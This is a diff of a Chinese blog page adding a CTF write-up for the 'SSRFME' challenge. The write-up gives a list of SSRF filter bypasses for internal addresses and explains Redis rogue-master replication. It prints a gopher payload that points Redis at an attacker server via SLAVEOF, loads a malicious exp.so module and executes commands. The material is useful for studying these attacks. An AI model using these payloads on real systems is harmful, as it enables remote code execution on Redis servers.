@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.3k 字
+      3.4k 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      35
+      49
        分钟
     </span>
   
@@ -295,9 +295,53 @@
 
 <p>最后尝试了flag在<code>/tmp/flagoefiu4r93</code></p>
 <p><img src="https://img-blog.csdnimg.cn/c6551e040d3847e9b4a28b7527292673.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h1 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h1><p>参考文章<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/147371417">https://zhuanlan.zhihu.com/p/147371417</a></p>
+<h1 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h1><p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/147371417">https://zhuanlan.zhihu.com/p/147371417</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gqtcgq/article/details/50273431">https://blog.csdn.net/gqtcgq/article/details/50273431</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-7">https://xz.aliyun.com/t/8163#toc-7</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5616">https://xz.aliyun.com/t/5616</a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>尝试建立主从连接过程，首先在配置中修改</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">protected-mode 设置为<span class="hljs-literal">no</span>    允许外部ip访问<br>找到bind 127.0.0.1 注释掉，这个是redis服务绑定可访问的ip， 所以127.0.0.1之外的机器都访问不了此redis服务<br>firewall-cmd <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=6379/tcp --permanent   开放端口<br>注意在服务器防火墙上也得开放端口<br>daemonize 设置为<span class="hljs-literal">yes</span><br><br>然后启动redis-server 即可默认6379端口也可设置为其他端口<br></code></pre></div></td></tr></table></figure>
+
+<p>从服务器会从服务器同步数据</p>
+<p><img src="https://img-blog.csdnimg.cn/7ecc41366a34439392b9ce7f96f85983.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>写入文件</p>
+<p><img src="https://img-blog.csdnimg.cn/a00e1cf3116445a7a41ac672f71cf406.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>原理</p>
+<ul>
+<li><code>slaveof</code>（新版改为<code>REPLICAOF</code>）建立后slave会向master发送<code>PSYNC</code>，请求开始复制</li>
+<li>master可以返回<code>FULLRESYNC</code>，进行全量复制，然后将自己持久化的数据发给slave，正常情况下包括<code>Replication ID</code>, <code>offset</code>，master存储的key-value等等</li>
+<li>slave会将这些数据保存到config中<code>dbfilename</code>指定的文件（默认为dump.rdb），然后再载入。</li>
+<li>通过伪造master，可以控制发往slave的信息，从而做到无脏数据写文件</li>
+<li>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件</li>
+<li>因此通过FULLRESYNC写入恶意so文件，然后<code>MODULE LOAD /path/to/mymodule.so</code>载入模块即可rce</li>
+</ul>
+<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>第一关绕过</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">parse_url与libcurl对url的解析差异绕过check_inner_ip函数对内网地址的判断<br>http:<span class="hljs-regexp">//u</span>:p@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span>@baidu.com/hint.php<br>还可以用<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>表示ipv4下所有ip地址<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/hint.php<br>http:<span class="hljs-regexp">//</span>[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>]<span class="hljs-regexp">//</span>hint.php<br>也可以DNS Rebinding。让域名在check_inner_ip的时候为外部地址，而curl请求的时候又变成内部IP。<br>https:<span class="hljs-regexp">//</span>lock.cmpxchg8b.com/rebinder.html<br></code></pre></div></td></tr></table></figure>
+
+<p>网上也看到很多绕过技巧</p>
+<p>利用URL的解析问题,</p>
+<p>利用不存在的协议头绕过指定的协议</p>
+<p>其他各种指向127.0.0.1的地址</p>
+<p>进制的转换绕过内网IP</p>
+<p>利用302跳转绕过内网IP</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/         # localhost就是代指<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">0</span>/                 # <span class="hljs-number">0</span>在window下代表<span class="hljs-number">0.0.0.0</span>，而在liunx下代表<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">0.0.0.0</span>/       # <span class="hljs-number">0.0.0.0</span>这个IP地址表示整个网络，可以代表本机 ipv<span class="hljs-number">4</span> 的所有地址<br><span class="hljs-attribute">http</span>://[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0.0.1</span>]/    # 在liunx下可用，window测试了下不行<br><span class="hljs-attribute">http</span>://[::]:<span class="hljs-number">80</span>/           # 在liunx下可用，window测试了下不行<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>/       # 用中文句号绕过<br><span class="hljs-attribute">http</span>://①②⑦.⓪.⓪.①<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">1</span>/<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">00000</span>.<span class="hljs-number">001</span>/ # <span class="hljs-number">0</span>的数量多一点少一点都没影响，最后还是会指向<span class="hljs-number">127.0.0.1</span><br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>下一层源码，这里可以参考上面的文章，但考点不在这，几个payload打不通。这里可以看到有redis密码，应该是ssrf打redis。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">1342</span>) <span class="hljs-string">&quot; &lt;?php</span><br><span class="hljs-string">if(<span class="hljs-subst">$_SERVER</span>[&#x27;REMOTE_ADDR&#x27;]===&quot;</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-string">&quot;)&#123;</span><br><span class="hljs-string">  highlight_file(__FILE__);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">if(isset(<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;]))&#123;</span><br><span class="hljs-string">  file_put_contents(<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;],&quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;redispass is root&#x27;</span>;<span class="hljs-keyword">exit</span>();<span class="hljs-string">&quot;.<span class="hljs-subst">$_POST</span>[&#x27;file&#x27;]);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>考点最后是redis主从复制来getshell，两个自动化脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>第二个项目中打ssrf的需要根据服务器改一下ip，rce命令也可以改，由于需要绕过第一层gopher访问的ip也要改成0.0.0.0.并且将第一个项目的exp.so上传到同目录。buu小号开一个服务器，下载两个项目，生成payload，解码看一下,手动打也差不多按这个。</p>
+<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">gopher:<span class="hljs-comment">//0.0.0.0:6379/_*2</span><br>$<span class="hljs-number">4</span><br>AUTH<br>$<span class="hljs-number">4</span><br>root   <span class="hljs-comment">//这里先认证</span><br>*<span class="hljs-number">3</span><br>$<span class="hljs-number">7</span><br>SLAVEOF<br>$<span class="hljs-number">14</span><br><span class="hljs-number">172.16</span>.<span class="hljs-number">152.217</span>   <span class="hljs-comment">//将服务器设置为主服务器</span><br>$<span class="hljs-number">4</span><br><span class="hljs-number">6666</span><br>*<span class="hljs-number">4</span><br>$<span class="hljs-number">6</span><br>CONFIG      <span class="hljs-comment">//设置目录</span><br>$<span class="hljs-number">3</span><br>SET<br>$<span class="hljs-number">3</span><br>dir<br>$<span class="hljs-number">5</span><br>/tmp/<br>*<span class="hljs-number">4</span><br>$<span class="hljs-number">6</span><br>config<br>$<span class="hljs-number">3</span><br>set<br>$<span class="hljs-number">10</span><br>dbfilename<br>$<span class="hljs-number">6</span><br>exp.so      <span class="hljs-comment">//上传exp.so</span><br>*<span class="hljs-number">3</span><br>$<span class="hljs-number">6</span><br>MODULE   <span class="hljs-comment">//加载so文件</span><br>$<span class="hljs-number">4</span><br>LOAD<br>$<span class="hljs-number">11</span><br>/tmp/exp.so<br>*<span class="hljs-number">2</span><br>$<span class="hljs-number">11</span><br>system.exec   <span class="hljs-comment">//执行命令</span><br>$<span class="hljs-number">14</span><br>cat$&#123;IFS&#125;/flag<br>*<span class="hljs-number">1</span><br>$<span class="hljs-number">4</span><br>quit<br><br></code></pre></div></td></tr></table></figure>
+
+<p>生成payload后再buu服务器上开启redis服务<code> python rogue-server.py</code>等待连接，回复<code>FULLRESYNC</code>进行全量复制。但很奇怪没有打出来。</p>
+<p><img src="https://img-blog.csdnimg.cn/1b9cb559e7e14dadad6f35f41e12fc59.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>前面已经返回ok了，到load so文件时出错了。。。。这里卡了很久，后来发现是buu靶机上没有git命令我用xshell传上去的，可能是so文件的问题。exp.so没有成功加载到从服务器上，不知道是不是buu环境的问题。</p>
 
             </div>
             <hr>
